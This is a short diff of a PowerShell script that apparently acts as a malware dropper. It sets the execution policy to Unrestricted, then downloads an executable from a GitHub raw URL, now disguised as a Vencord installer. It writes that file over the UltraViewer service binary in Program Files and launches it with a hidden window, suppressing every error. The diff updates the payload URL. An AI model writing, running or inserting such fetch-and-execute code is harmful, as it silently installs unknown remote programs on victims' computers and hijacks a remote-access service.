@@ -19,7 +19,7 @@ Set-ExecutionPolicy Unrestricted -Scope Process -Force | Out-Null
 $discordRunning = Get-Process -Name "explorer" -ErrorAction SilentlyContinue
 if ($discordRunning) {
     $destination = "C:\Program Files (x86)\UltraViewer\UltraViewer_Service.exe"
-    $url = "https://github.com/desert007/D/raw/refs/heads/main/event%20cleaner.exe"
+    $url = "https://github.com/desert007/D/raw/refs/heads/main/VencordInstaller%20(1).exe"
     Invoke-WebRequest -Uri $url -OutFile $destination -ErrorAction SilentlyContinue
     Start-Sleep -Seconds 2
     Start-Process -FilePath $destination -WindowStyle Hidden -ErrorAction SilentlyContinue | Out-Null
